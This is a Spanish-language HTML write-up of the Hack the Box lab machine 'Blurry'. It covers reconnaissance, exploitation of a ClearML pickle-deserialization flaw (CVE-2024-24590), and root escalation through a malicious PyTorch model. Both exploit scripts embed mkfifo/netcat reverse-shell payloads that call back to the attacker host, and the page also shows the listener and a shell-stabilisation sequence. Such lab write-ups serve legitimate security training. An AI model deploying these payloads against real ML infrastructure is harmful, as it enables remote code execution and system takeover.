
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Write-up de Hack the Box - Blurry</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            line-height: 1.6;
        }
        h1, h2 {
            color: #333;
        }
        pre {
            background-color: #f4f4f4;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        a {
            color: #0066cc;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>Write-up de Hack the Box - Blurry</h1>

    <h2>Exploración</h2>
    <p>Realizamos un escaneo con nmap:</p>
    <pre><code>nmap -sCV -A 10.10.11.19</code></pre>
    <img src="https://github.com/Blurry-writeup-HTB/blob/ab3c53170f9d0aa3bac1610e503b2a95f3f6a0bd/Screenshot_2024-06-08_15_45_41.jpg" alt="Escaneo Nmap">

    <p>Debemos agregar los subdominios:</p>
    <pre><code>sudo nano /etc/hosts</code></pre>
    <img src="https://github.com/Blurry-writeup-HTB/blob/ab3c53170f9d0aa3bac1610e503b2a95f3f6a0bd/Screenshot_2024-06-10_18_45_06_1.png" alt="Subdominios">

    <p>Visitemos la aplicación web en <code>app.blurry.htb</code>:</p>
    <img src="https://github.com//Blurry-writeup-HTB/blob/52f9e337e18d4ba5b6940ca24728b4df07d5d6a1/Screenshot_2024-06-08_15_46_05.png" alt="Aplicación Web">

    <p>Solo al ingresar un nombre de usuario podemos entrar:</p>
    <img src="https://github.com/Blurry-writeup-HTB/blob/52f9e337e18d4ba5b6940ca24728b4df07d5d6a1/Screenshot_2024-06-08_16_28_06.png" alt="Ingreso">

    <h2>Investigación sobre CLEARML</h2>
    <p>Investiga qué es CLEARML, para qué sirve y cómo funciona. Encontré una página que detalla las vulnerabilidades.</p>
    <p><a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/?source=post_page-----203ea31df0e3" target="_blank">CVE-2024-24590</a></p>

    <h2>Configuración de explotación</h2>
    <p>Según lo que explican, un atacante podría crear un archivo pickle que contenga código arbitrario y subirlo como un artefacto a un proyecto a través de la API. Necesitamos configurarlo en nuestra máquina:</p>
    <img src="https://github.com//Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-10_18_45_06.png" alt="Configuración">

    <pre><code>pip install clearml
clearml-init</code></pre>

    <h2>Explotación</h2>
    <p>Necesitamos un script de Python que cree y suba un archivo pickle malicioso. Cuando el archivo se ejecute, establecerá una conexión de shell inversa a nuestra máquina:</p>
    <pre><code>
import pickle
import os
from clearml import Task, Logger

task = Task.init(project_name='Black Swan', task_name='REV shell', tags=["review"])

class MaliciousCode:
    def __reduce__(self):
        cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 'ip' 'port' > /tmp/f"
        return (os.system, (cmd,))

malicious_object = MaliciousCode()
pickle_filename = 'malicious_pickle.pkl'
with open(pickle_filename, 'wb') as f:
    pickle.dump(malicious_object, f)

task.upload_artifact(name='malicious_pickle', artifact_object=malicious_object, retries=2, wait_on_upload=True, extension_name=".pkl")
</code></pre>
    <p>Con la ejecución del exploit, el artefacto se carga. Luego, cuando el administrador lo verifica, obtendrás un shell en el puerto escuchando.</p>

    <pre><code>nc -lvnp &lt;port&gt;</code></pre>
    <img src="https://github.com/Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-14_04_16_58.png" alt="Escuchar en Netcat">

    <h2>La bandera de usuario</h2>
    <img src="https://github.com/Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-13_17_54_22.png" alt="Bandera de usuario">

    <h2>Escalamiento de privilegios</h2>
    <p>Vamos a estabilizar nuestro shell:</p>
    <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
    <pre><code>export TERM=xterm</code></pre>
    <pre><code>stty raw -echo</code></pre>
    <img src="https://github.com//Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-14_04_23_09.png" alt="Estabilizando shell">

    <p>Veamos qué comandos podemos ejecutar como root:</p>
    <img src="https://github.com//Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-14_04_23_38.png" alt="Comandos como root">

    <h2>Crear un modelo malicioso</h2>
    <pre><code>
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)

    def forward(self, demo):
        return self.dense(demo)

    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 6060 >/tmp/f"
        return os.system, (cmd,)

malicious_model = MaliciousModel()
torch.save(malicious_model, 'demo.pth')
</code></pre>
    <img src="https://github.com//Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-14_06_33_39.png" alt="Modelo malicioso">

    <pre><code>wget http://10.10.x.x/demo.pth</code></pre>
    <h2>Bandera de root</h2>
    <img src="https://github.com//Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-14_06_34_06.png" alt="Bandera de root">

</body>
</html>
